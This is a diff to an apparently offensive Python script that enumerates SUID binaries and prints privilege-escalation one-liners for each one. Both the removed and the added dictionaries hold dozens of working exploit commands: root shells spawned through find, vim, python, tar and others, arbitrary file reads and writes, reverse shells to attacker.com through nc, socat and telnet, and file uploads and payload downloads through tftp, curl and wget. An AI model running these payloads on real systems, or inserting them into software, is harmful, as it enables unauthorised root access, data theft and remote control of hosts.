@@ -8,118 +8,12 @@ from sys import argv
 from os import system, popen
 from time import sleep
 
+
 """
 The following list contains exploits for all known SUID binaries
 """
 
-myDict={
-   'aria2c':'COMMAND=\'id\'\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x',
-   'arp':'LFILE=file_to_read\n./arp -v -f "$LFILE"',
-   'ash':"./ash",
-   'base64':'LFILE=file_to_read\n./base64 "$LFILE" | base64 --decode',
-   'bash':"./bash -p",
-   'busybox':"./busybox sh",
-   'cat':'LFILE=file_to_read\n./cat "$LFILE"',
-   'chmod':"LFILE=file_to_change\n./chmod 0777 $LFILE",
-   'chown':"LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE",
-   'cp':'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./cp $TF $LFILE',
-   'csh':"./csh -b",
-   'curl':"URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE",
-   'cut':'LFILE=file_to_read\n./cut -d "" -f1 "$LFILE"',
-   'dash':"./dash -p",
-   'date':"LFILE=file_to_read\n./date -f $LFILE",
-   'dd':'LFILE=file_to_write\necho "data" | ./dd of=$LFILE',
-   'diff':"LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE",
-   'dmsetup':"./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'",
-   'docker':"./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
-   'emacs':'./emacs -Q -nw --eval \'(term "/bin/sh -p")\'',
-   'env':"./env /bin/sh -p",
-   'expand':'LFILE=file_to_read\n./expand "$LFILE"',
-   'expect':"./expect -c 'spawn /bin/sh -p;interact'",
-   'file':"LFILE=file_to_read\n./file -m $LFILE",
-   'find':"./find . -exec /bin/sh -p \\; -quit",
-   'flock':"./flock -u / /bin/sh -p",
-   'fmt':'LFILE=file_to_read\n./fmt -pNON_EXISTING_PREFIX "$LFILE"',
-   'fold':'LFILE=file_to_read\n./fold -w99999999 "$LFILE"',
-   'gdb':'./gdb -nx -ex \'python import os; os.execl("/bin/sh", "sh", "-p")\' -ex quit',
-   'gimp':'./gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'',
-   'grep':"LFILE=file_to_read\n./grep '' $LFILE",
-   'head':'LFILE=file_to_read\n./head -c1G "$LFILE"',
-   'ionice':"./ionice /bin/sh -p",
-   'ip':'LFILE=file_to_read\n./ip -force -batch "$LFILE"',
-   'jjs':'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs',
-   'jq':'LFILE=file_to_read\n./jq -Rr . "$LFILE"',
-   'jrunscript':'./jrunscript -e "exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\')"',
-   'ksh':"./ksh -p",
-   'ld.so':"./ld.so /bin/sh -p",
-   'less':"./less file_to_read",
-   'logsave':"./logsave /dev/null /bin/sh -i -p",
-   'make':'COMMAND=\'/bin/sh -p\'\n./make -s --eval=$\'x:\\n\\t-\'"$COMMAND"',
-   'more':"./more file_to_read",
-   'mv':'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE',
-   'nano':"./nano\n^R^X\nreset; sh 1>&0 2>&0",
-   'nice':"./nice /bin/sh -p",
-   'nl':"LFILE=file_to_read\n./nl -bn -w1 -s '' $LFILE",
-   'node':'./node -e \'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});\'',
-   'od':'LFILE=file_to_read\n./od -An -c -w9999 "$LFILE"',
-   'openssl':'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n',
-   'perl':'./perl -e \'exec "/bin/sh";\'',
-   'pg':"./pg file_to_read",
-   'php':'CMD="/bin/sh"\n./php -r "pcntl_exec(\'/bin/sh\', [\'-p\']);"',
-   'pico':"./pico\n^R^X\nreset; sh 1>&0 2>&0",
-   'python':'./python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'',
-   'readelf':"LFILE=file_to_read\n./readelf -a @$LFILE",
-   'rlwrap':"./rlwrap -H /dev/null /bin/sh -p",
-   'rpm':'./rpm --eval \'%{lua:os.execute("/bin/sh", "-p")}\'',
-   'rpmquery':'./rpmquery --eval \'%{lua:posix.exec("/bin/sh", "-p")}\'',
-   'rsync':'./rsync -e \'sh -p -c "sh 0<&2 1>&2"\' 127.0.0.1:/dev/null',
-   'run-parts':"./run-parts --new-session --regex '^sh$' /bin --arg='-p'",
-   'rvim':'./rvim -c \':lua os.execute("reset; exec sh")\'',
-   'sed':'LFILE=file_to_read\n./sed -e \'\' "$LFILE"',
-   'setarch':"./setarch $(arch) /bin/sh -p",
-   'shuf':'LFILE=file_to_write\n./shuf -e DATA -o "$LFILE"\nsudo:',
-   'sort':'LFILE=file_to_read\n./sort -m "$LFILE"',
-   'start-stop-daemon':"./start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p",
-   'stdbuf':"./stdbuf -i0 /bin/sh -p",
-   'strace':"./strace -o /dev/null /bin/sh -p",
-   'systemctl':'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF',
-   'tail':'LFILE=file_to_read\n./tail -c1G "$LFILE"',
-   'taskset':"./taskset 1 /bin/sh -p",
-   'tclsh':"./tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr",
-   'tee':'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"',
-   'tftp':"RHOST=attacker.com\n./tftp $RHOST\nput file_to_send",
-   'time':"./time /bin/sh -p",
-   'timeout':"./timeout 7d /bin/sh -p",
-   'ul':'LFILE=file_to_read\n./ul "$LFILE"',
-   'unexpand':'LFILE=file_to_read\n./unexpand -t99999999 "$LFILE"',
-   'uniq':'LFILE=file_to_read\n./uniq "$LFILE"',
-   'unshare':"./unshare -r /bin/sh",
-   'vim':'./vim -c \':lua os.execute("reset; exec sh")\'',
-   'watch':"./watch 'reset; exec sh 1>&0 2>&0'",
-   'wget':"export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\n./wget $URL -O $LFILE",
-   'xargs':"./xargs -a /dev/null sh -p",
-   'xxd':'LFILE=file_to_read\n./xxd "$LFILE" | xxd -r',
-   'zsh':"./zsh",
-   'awk':'./awk \'BEGIN {system("/bin/sh")}\'',
-   'ed':"./ed\n!/bin/sh",
-   'gawk':'./gawk \'BEGIN {system("/bin/sh")}\'',
-   'git':'PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help',
-   'iftop':"./iftop\n!/bin/sh",
-   'ldconfig':'TF=$(mktemp -d)\necho "$TF" > "$TF/conf"\n# move malicious libraries in $TF\n./ldconfig -f "$TF/conf"',
-   'lua':'./lua -e \'os.execute("/bin/sh")\'',
-   'mawk':'./mawk \'BEGIN {system("/bin/sh")}\'',
-   'mysql':"./mysql -e '\\! /bin/sh'",
-   'nawk':'./nawk \'BEGIN {system("/bin/sh")}\'',
-   'nc':"RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT",
-   'nmap':'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\n./nmap --script=$TF',
-   'pic':"./pic -U\n.PS\nsh X sh X",
-   'scp':'TF=$(mktemp)\necho \'sh 0<&2 1>&2\' > $TF\nchmod +x "$TF"\n./scp -S $TF a b:',
-   'socat':"RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane",
-   'sqlite3':"./sqlite3 /dev/null '.shell /bin/sh'",
-   'tar':"./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
-   'telnet':"RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh",
-   'zip':"TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF"
-}
+myDict={'arp': 'LFILE=file_to_read\n./arp -v -f "$LFILE"', 'ed': './ed\n!/bin/sh', 'nmap': 'TF=$(mktemp)\necho \'os.execute("/bin/sh")\' > $TF\n./nmap --script=$TF', 'systemctl': 'TF=$(mktemp).service\necho \'[Service]\nType=oneshot\nExecStart=/bin/sh -c "id > /tmp/output"\n[Install]\nWantedBy=multi-user.target\' > $TF\n./systemctl link $TF\n./systemctl enable --now $TF', 'tftp': 'RHOST=attacker.com\n./tftp $RHOST\nput file_to_send', 'ldconfig': 'TF=$(mktemp -d)\necho "$TF" > "$TF/conf"\n# move malicious libraries in $TF\n./ldconfig -f "$TF/conf"', 'aria2c': 'COMMAND=\'id\'\nTF=$(mktemp)\necho "$COMMAND" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x', 'git': 'PAGER=\'sh -c "exec sh 0<&1"\' ./git -p help', 'scp': 'TF=$(mktemp)\necho \'sh 0<&2 1>&2\' > $TF\nchmod +x "$TF"\n./scp -S $TF a b:', 'mysql': "./mysql -e '\\! /bin/sh'", 'awk': './awk \'BEGIN {system("/bin/sh")}\'', 'emacs': './emacs -Q -nw --eval \'(term "/bin/sh -p")\'', 'gawk': './gawk \'BEGIN {system("/bin/sh")}\'', 'curl': 'URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE', 'shuf': 'LFILE=file_to_write\n./shuf -e DATA -o "$LFILE"\nsudo:', 'cp': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./cp $TF $LFILE', 'jjs': 'echo "Java.type(\'java.lang.Runtime\').getRuntime().exec(\'/bin/sh -pc \\$@|sh\\${IFS}-p _ echo sh -p <$(tty) >$(tty) 2>$(tty)\').waitFor()" | ./jjs', 'chmod': 'LFILE=file_to_change\n./chmod 0777 $LFILE', 'tar': './tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh', 'nano': './nano\n^R^X\nreset; sh 1>&0 2>&0', 'openssl': 'openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n', 'diff': 'LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE', 'zip': "TF=$(mktemp -u)\n./zip $TF /etc/hosts -T -TT 'sh #'\nsudo rm $TF", 'wget': 'export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\n./wget $URL -O $LFILE', 'csh': './csh -b', 'dd': 'LFILE=file_to_write\necho "data" | ./dd of=$LFILE', 'gimp': './gimp -idf --batch-interpreter=python-fu-eval -b \'import os; os.execl("/bin/sh", "sh", "-p")\'', 'mawk': './mawk \'BEGIN {system("/bin/sh")}\'', 'jq': 'LFILE=file_to_read\n./jq -Rr . "$LFILE"', 'readelf': 'LFILE=file_to_read\n./readelf -a @$LFILE', 'tee': 'LFILE=file_to_write\necho DATA | ./tee -a "$LFILE"', 'ash': './ash', 'telnet': 'RHOST=attacker.com\nRPORT=12345\n./telnet $RHOST $RPORT\n^]\n!/bin/sh', 'fmt': 'LFILE=file_to_read\n./fmt -pNON_EXISTING_PREFIX "$LFILE"', 'base64': 'LFILE=file_to_read\n./base64 "$LFILE" | base64 --decode', 'ip': 'LFILE=file_to_read\n./ip -force -batch "$LFILE"', 'date': 'LFILE=file_to_read\n./date -f $LFILE', 'nawk': './nawk \'BEGIN {system("/bin/sh")}\'', 'pic': './pic -U\n.PS\nsh X sh X', 'tclsh': './tclsh\nexec /bin/sh -p <@stdin >@stdout 2>@stderr', 'pico': './pico\n^R^X\nreset; sh 1>&0 2>&0', 'nc': 'RHOST=attacker.com\nRPORT=12345\n./nc -e /bin/sh $RHOST $RPORT', 'dmsetup': "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'", 'file': 'LFILE=file_to_read\n./file -m $LFILE', 'sqlite3': "./sqlite3 /dev/null '.shell /bin/sh'", 'socat': 'RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane', 'mv': 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./mv $TF $LFILE', 'iftop': './iftop\n!/bin/sh', 'lua': './lua -e \'os.execute("/bin/sh")\'', 'chown': 'LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE', 'zsh': './zsh'}
 
 """
 The following list contains all default SUID bins found within Unix
@@ -293,8 +187,9 @@ def doSomethingPlis(listOfSuidBins):
 
 	for binary in binsInGTFO:
 		bName = binary[::-1].split("/")[0][::-1]
-		print(green + binary + white + " \n" + myDict[bName])
-		print("\n\n")
+		if(bName not in suidExploitation):
+			print("cd "+green + binary + white + " \n" + myDict[bName])
+			print("\n\n")
 	
 	print(white + barLine+"\n\n")
 	return(binsInGTFO, defaultSuidBins, customSuidBins)
